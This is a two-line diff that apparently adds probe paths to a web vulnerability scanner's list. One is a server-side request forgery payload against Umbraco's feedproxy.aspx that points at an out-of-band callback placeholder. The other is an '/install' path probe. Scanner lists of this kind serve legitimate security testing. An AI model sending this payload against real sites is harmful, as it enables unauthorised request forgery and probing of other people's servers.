@@ -1,0 +1,2 @@
+/Umbraco/feedproxy.aspx?url=http://{{interactsh-url}}
+/install
